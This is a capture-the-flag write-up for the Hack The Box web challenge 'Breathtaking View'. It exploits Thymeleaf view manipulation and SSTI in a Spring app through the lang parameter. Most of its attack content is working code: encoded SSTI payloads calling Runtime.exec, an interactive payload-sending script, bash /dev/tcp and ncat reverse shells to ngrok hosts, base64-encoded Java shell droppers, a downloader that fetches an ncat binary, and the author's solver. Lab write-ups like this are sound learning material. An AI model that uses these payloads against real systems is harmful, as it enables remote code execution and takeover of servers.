# Web

## Description

Check out my new website showcasing a breathtaking view—let's hope no one can 'manipulate' it!

## Source

`Dockerfile`
```bash
FROM openjdk:8-jdk-slim

# Install Maven
RUN apt-get update && apt-get install -y maven && rm -rf /var/lib/apt/lists/*

# Copy the entire project into the container
COPY . /app

# Set the working directory
WORKDIR /app

# Compile the project
RUN mvn clean package

# Copy the compiled JAR file to the final location
RUN cp target/breathtaking_view-0.0.1-SNAPSHOT.jar /app/breathtaking_view-0.0.1-SNAPSHOT.jar

# Handle the flag
COPY flag.txt /
RUN FLAG_NAME=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12) && cp /flag.txt "/flag_${FLAG_NAME}_.txt" && rm /flag.txt

# Set the command to run the application
CMD ["java", "-jar", "breathtaking_view-0.0.1-SNAPSHOT.jar"]

# Expose the port the application runs on
EXPOSE 8081
```

`application.properties`
```ini
spring.application.name=breathtaking_view
server.port=8081
spring.jpa.database-platform=org.sqlite.hibernate.dialect.SQLiteDialect
spring.datasource.url=jdbc:sqlite:hacktheboxDB
spring.datasource.driver-class-name=org.sqlite.JDBC
spring.jpa.hibernate.ddl-auto=create-drop
```

`main/java/com/hackthebox/breathtaking_view/Repositories/UserRepository.java`
```java
package com.hackthebox.breathtaking_view.Repositories;

import org.springframework.data.jpa.repository.JpaRepository;
import com.hackthebox.breathtaking_view.Models.Users;

public interface UserRepository extends JpaRepository<Users, Long> {
    Users findByUsername(String username);
}
```

`main/java/com/hackthebox/breathtaking_view/Models/Users.java`
```java
package com.hackthebox.breathtaking_view.Models;

import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.Table;
@Entity
@Table(name = "users")
public class Users {
    public Long getId() { return id; }
    public void setId(Long id) { this.id = id; }

    public String getUsername() { return username; }
    public void setUsername(String username) { this.username = username; }

    public String getPassword() { return password; }
    public void setPassword(String password) { this.password = password; }

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    private String username;
    private String password;
}
```

`main/java/com/hackthebox/breathtaking_view/Controllers/IndexController.java`
```java
package com.hackthebox.breathtaking_view.Controllers;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

import javax.servlet.http.HttpSession;

@Controller
public class IndexController {
    @GetMapping("/")
    public String index(@RequestParam(defaultValue = "en") String lang, HttpSession session, RedirectAttributes redirectAttributes) {
        if (session.getAttribute("user") == null) {
            return "redirect:/login";
        }

        if (lang.toLowerCase().contains("java")) {
            redirectAttributes.addFlashAttribute("errorMessage", "But.... For what?");
            return "redirect:/";
        }

        return lang + "/index";
    }
}
```

`main/java/com/hackthebox/breathtaking_view/Controllers/AccountController.java`
```java
package com.hackthebox.breathtaking_view.Controllers;

import com.hackthebox.breathtaking_view.Models.Users;
import com.hackthebox.breathtaking_view.Repositories.UserRepository;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

import javax.servlet.http.HttpSession;

@Controller
public class AccountController {

    @Autowired
    private UserRepository userRepository;

    @GetMapping("/login")
    public String loginPage() {
        return "login";
    }

    @PostMapping("/login")
    public String login(@RequestParam String username, @RequestParam String password, RedirectAttributes redirectAttributes, HttpSession session) {
        try {
            Users user = userRepository.findByUsername(username);
            if (user != null && user.getPassword().equals(password)) {
                session.setAttribute("user", user);
                return "redirect:/";
            } else {
                redirectAttributes.addFlashAttribute("errorMessage", "Invalid username or password.");
                return "redirect:/login";
            }
        } catch (Exception e) {
            redirectAttributes.addFlashAttribute("errorMessage", "An error occurred while logging in.");
            return "redirect:/login";
        }
    }

    @GetMapping("/register")
    public String registerPage() {
        return "register";
    }

    @PostMapping("/register")
    public String register(@RequestParam String username, @RequestParam String password, RedirectAttributes redirectAttributes) {
        try {
            if (userRepository.findByUsername(username) != null) {
                redirectAttributes.addFlashAttribute("errorMessage", "Username already exists.");
                return "redirect:/register";
            }
            Users user = new Users();
            user.setUsername(username);
            user.setPassword(password);
            userRepository.save(user);
            return "redirect:/login";
        } catch (Exception e) {
            redirectAttributes.addFlashAttribute("errorMessage", "An error occurred while registering.");
            return "redirect:/register";
        }
    }
}
```

## Solution

![breathtaking-view.png](/assets/ctf/htb/web/breathtaking-view.png)

Sign up.

::: tip Creds
`test02:test02`
:::

![breathtaking-view-1.png](/assets/ctf/htb/web/breathtaking-view-1.png)

URL changed to: [http://83.136.255.40:33805/?lang=fr](http://83.136.255.40:33805/?lang=fr)

![breathtaking-view-2.png](/assets/ctf/htb/web/breathtaking-view-2.png)

`IndexController` does all the page including and stuff. Via parameter injection it receives get parameter `lang`.
```java
@Controller
public class IndexController {
    @GetMapping("/")
    public String index(@RequestParam(defaultValue = "en") String lang, HttpSession session, RedirectAttributes redirectAttributes) {
        if (session.getAttribute("user") == null) {
            return "redirect:/login";
        }

        if (lang.toLowerCase().contains("java")) {
            redirectAttributes.addFlashAttribute("errorMessage", "But.... For what?");
            return "redirect:/";
        }

        return lang + "/index";
    }
}
```

[https://0xn3va.gitbook.io/cheat-sheets/framework/spring/view-manipulation](https://0xn3va.gitbook.io/cheat-sheets/framework/spring/view-manipulation)

_This exploit uses [expression preprocessing](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/). In order for the expression to be executed by the Thymeleaf, no matter what prefixes or suffixes are, it is necessary to surround it with `__${` and `}__::.x`._

SSTI is possible:

```java
__${ 7*7 }__::.x
__$%7B%207*7%20%7D__::.x
```

![breathtaking-view-3.png](/assets/ctf/htb/web/breathtaking-view-3.png)

[https://exploit-notes.hdks.org/exploit/web/framework/java/spring-pentesting/](https://exploit-notes.hdks.org/exploit/web/framework/java/spring-pentesting/)
[https://www.pwny.cc/web-attacks/server-side-template-injection-ssti#expression-language-el](https://www.pwny.cc/web-attacks/server-side-template-injection-ssti#expression-language-el)

```java
__*{"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec("id")}__::.x
%5F%5F%2A%7B%22%22%2EgetClass%28%29%2EforName%28%22ja%22%2B%22va%2Elang%2ERuntime%22%29%2EgetRuntime%28%29%2Eexec%28%22id%22%29%7D%5F%5F%3A%3A%2Ex%0D%0A

-->
Error resolving template [java.lang.UNIXProcess@4bfbaa59], template might not exist or might not be accessible by any of the configured Template Resolvers
```

To make interaction easier I used a script:
```python
import requests
import re

URL = 'http://83.136.253.59:30780'
AUTH = {'username': 'test02', 'password': 'test02'}

with requests.Session() as session:
    session.post(f'{URL}/register', data=AUTH)
    session.post(f'{URL}/login', data=AUTH)

    while True:
        payload = input('Payload: ')
        params = {'lang': f'__${{%s}}__::.x' % payload }
        resp = session.get(URL, params=params)
        if 'Invalid template name specification' in resp.text:
            print("Payload failed!")
            print(resp.text)
        else:
            path = re.search(r'\[(.*)\]', resp.json()['message']).group(1)
            print(path)
```

```bash
Payload: "".getClass().forName("ja"+"va.lang.System").getenv()
{
    KUBERNETES_PORT_443_TCP=tcp://10.128.0.1:443, 
    PATH=/usr/local/openjdk-8/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, 
    KUBERNETES_PORT_443_TCP_ADDR=10.128.0.1, 
    KUBERNETES_PORT=tcp://10.128.0.1:443, 
    JAVA_HOME=/usr/local/openjdk-8, 
    KUBERNETES_PORT_443_TCP_PROTO=tcp, 
    KUBERNETES_SERVICE_HOST=10.128.0.1, 
    LANG=C.UTF-8, 
    KUBERNETES_SERVICE_PORT=443, 
    HOSTNAME=ng-932570-webbreathtakingviewmp-v3jmq-7d756f9fd-6sjkz, 
    KUBERNETES_PORT_443_TCP_PORT=443, 
    KUBERNETES_SERVICE_PORT_HTTPS=443, 
    JAVA_VERSION=8u342, 
    HOME=/root
}
```

After too many trials and errors I gave up on RCE (command -> read output) and switched to getting a reverse shell.

```java
"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec(new String[] { "/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/19194 0>&1" })
```

```bash
root@ng-932570-webbreathtakingviewmp-v3jmq-7d756f9fd-6sjkz:/# cat /flag*
HTB{whAt_4_v1ewWwww!}
```

> Flag: `HTB{whAt_4_v1ewWwww!}`

## Post Flag

### Garbage Dump

Mostly useless, but leaving it here. `exec` doesn't allow redirections and stuff btw as string AFAIK.

```java
${"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec("echo x > /dev/tcp/6.tcp.eu.ngrok.io/19194")}

${"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec("id").getInputStream().read()}
${"".getClass().forName("java.lang.Runtime").getRuntime().exec("id").getInputStream().transferTo(new java.io.InputStreamReader(new java.io.BufferedReader(new java.io.InputStreamReader(System.out))))}

${"".getClass().forName("ja" + "va.lang.Runtime").getRuntime().exec("id").getInputStream().getClass().forName("ja" + "va.io.InputStreamReader").newInstance().readLine()}

new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("your_command").getInputStream()))
    .lines().forEach(System.out::println);

${"".getClass().forName("ja" + "va.io.BufferedReader")("".getClass().forName("ja" + "va.io.InputStreamReader"))("".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec("id").getInputStream()}

("").getClass().forName("ja"+"va.util.Scanner").getConstructor(("").getClass().forName("ja"+"va.io.InputStream").getClass()).newInstance(("").getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec("id").getInputStream()).next()


("").getClass().forName("ja"+"va.util.Scanner").getDeclaredConstructors()[0](("").getClass().forName("ja"+"va.io.InputStream")).newInstance(("").getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec("id").getInputStream())

${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("id")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}

("").getClass().forName("ja"+"va.util.Scanner").getDeclaredConstructors()[0].newInstance(("").getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec("id").getInputStream())

"".getClass().forName("ja"+"va.lang.System").getenv()

${"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec('cat etc/passwd')}

__${("").getClass().forName("ja"+"va.util.Scanner")("".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec("id").getInputStream()).next()}__::.x

-------
"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec("echo cHVibGljIGNsYXNzIFNoZWxsIHsNCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgTWFpbihTdHJpbmdbXSBhcmdzKSB7DQogICAgICAgIFByb2Nlc3MgcDsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIHAgPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJiYXNoIC1jICRAfGJhc2ggMCBlY2hvIGJhc2ggLWkgPiYgL2Rldi90Y3AvNi50Y3AuZXUubmdyb2suaW8vMTkxOTQgMD4mMSIpOw0KICAgICAgICAgICAgcC53YWl0Rm9yKCk7DQogICAgICAgICAgICBwLmRlc3Ryb3koKTsNCiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt9DQogICAgfQ0KfQ== | base64 -d > /tmp/Shell.ja"+"va")
"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec("ja"+"vac /tmp/Shell.ja"+"va")
"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec("ja"+"va /tmp/Shell")

"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec("echo cHVibGljIGNsYXNzIFNoZWxsIHsNCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgTWFpbihTdHJpbmdbXSBhcmdzKSB7DQogICAgICAgIFByb2Nlc3MgcDsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIHAgPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJiYXNoIC1jICRAfGJhc2ggMCBlY2hvIGJhc2ggLWkgPiYgL2Rldi90Y3AvNi50Y3AuZXUubmdyb2suaW8vMTkxOTQgMD4mMSIpOw0KICAgICAgICAgICAgcC53YWl0Rm9yKCk7DQogICAgICAgICAgICBwLmRlc3Ryb3koKTsNCiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt9DQogICAgfQ0KfQ== | base64 -d > /tmp/Shell.ja"+"va")


"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec(new String[] { "/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/19194 0>&1" })
```

### Challenge `solver.py` by Author

`solver.py` from the challenge 💀

```python
import requests
import re

s = requests.Session()
base_url = "http://localhost:1337"

# Register
s.post(url=base_url+"/register", data={ "username": "a", "password": "a"})

# Login
s.post(url=base_url+"/login", data={ "username": "a", "password": "a" }, allow_redirects=True)

# Get flag file name
flag_name = s.get(url=base_url, params={
    "lang": """__${#this.getClass().forName('ja'+'va.io.File').getConstructor(''.getClass()).newInstance('/').listFiles()[21]}__::"""
})
flag_name = re.search(r"\[(.*?)\]", flag_name.json()['message']).group(1)
print("Flag name: "+flag_name)

# Read the flag
flag = s.get(url=base_url, params={
    "lang": """__${#this.getClass().forName('ja'+'va.nio.file.Files').readAllLines(''.getClass().forName('ja'+'va.nio.file.Paths').get('"""+flag_name+"""'))}__::"""
})
print("Flag: "+re.search(r"\[(.*?)\]", flag.json()['message']).group(1))
```

With my script:
```bash
Payload: 7*7
49
Payload: ''.getClass().forName('ja'+'va.io.File').getConstructor(''.getClass()).newInstance('/').listFiles()[20]
/flag_2dMWMGbWbpLv_.txt
Payload: ''.getClass().forName('ja'+'va.nio.file.Files').readAllLines(''.getClass().forName('ja'+'va.nio.file.Paths').get('/flag_2dMWMGbWbpLv_.txt'))[0]
HTB{whAt_4_v1ewWwww!}
```

### Overkill

Create a Java file which downloads the static `ncat` binary.
```java
import java.io.BufferedInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
class Netcat {
    public static void main(String[] args) {
        try (BufferedInputStream in = new BufferedInputStream(new URL("https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/ncat").openStream()); FileOutputStream fileOutputStream = new FileOutputStream("/tmp/ncat")) {
            byte dataBuffer[] = new byte[1024];
            int bytesRead;
            while ((bytesRead = in .read(dataBuffer, 0, 1024)) != -1) {
                fileOutputStream.write(dataBuffer, 0, bytesRead);
            }
        } catch (Exception e) {}
    }
}
```

Convert to Base64, upload to remote via echo and base64. 
```java
"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec(new String[] { "/bin/bash", "-c", "echo aW1wb3J0IGphdmEuaW8uQnVmZmVyZWRJbnB1dFN0cmVhbTsNCmltcG9ydCBqYXZhLmlvLkZpbGVPdXRwdXRTdHJlYW07DQppbXBvcnQgamF2YS5pby5JT0V4Y2VwdGlvbjsNCmltcG9ydCBqYXZhLm5ldC5VUkw7DQpjbGFzcyBOZXRjYXQgew0KICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZ1tdIGFyZ3MpIHsNCiAgICAgICAgdHJ5IChCdWZmZXJlZElucHV0U3RyZWFtIGluID0gbmV3IEJ1ZmZlcmVkSW5wdXRTdHJlYW0obmV3IFVSTCgiaHR0cHM6Ly9naXRodWIuY29tL2FuZHJldy1kL3N0YXRpYy1iaW5hcmllcy9yYXcvcmVmcy9oZWFkcy9tYXN0ZXIvYmluYXJpZXMvbGludXgveDg2XzY0L25jYXQiKS5vcGVuU3RyZWFtKCkpOyBGaWxlT3V0cHV0U3RyZWFtIGZpbGVPdXRwdXRTdHJlYW0gPSBuZXcgRmlsZU91dHB1dFN0cmVhbSgiL3RtcC9uY2F0IikpIHsNCiAgICAgICAgICAgIGJ5dGUgZGF0YUJ1ZmZlcltdID0gbmV3IGJ5dGVbMTAyNF07DQogICAgICAgICAgICBpbnQgYnl0ZXNSZWFkOw0KICAgICAgICAgICAgd2hpbGUgKChieXRlc1JlYWQgPSBpbiAucmVhZChkYXRhQnVmZmVyLCAwLCAxMDI0KSkgIT0gLTEpIHsNCiAgICAgICAgICAgICAgICBmaWxlT3V0cHV0U3RyZWFtLndyaXRlKGRhdGFCdWZmZXIsIDAsIGJ5dGVzUmVhZCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7fQ0KICAgIH0NCn0= | base64 -d > /tmp/Netcat.ja"+"va" })
```

Go into `/tmp`, compile java code, run java code and make it executable 
```java
"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec(new String[] { "/bin/bash", "-c", "cd /tmp && ja"+"vac Netcat.ja"+"va && ja"+"va Netcat && chmod +x ncat" })
```

> **Note**: Binary is ~2.8mb in size, download may take few seconds.

Finally run the `ncat` to get a reverse shell:
```java
"".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec(new String[] { "/bin/bash", "-c", "/tmp/ncat 2.tcp.eu.ngrok.io 13189 -e /bin/bash" })
```

Uploading `ncat` unlocks new features of data transfer.

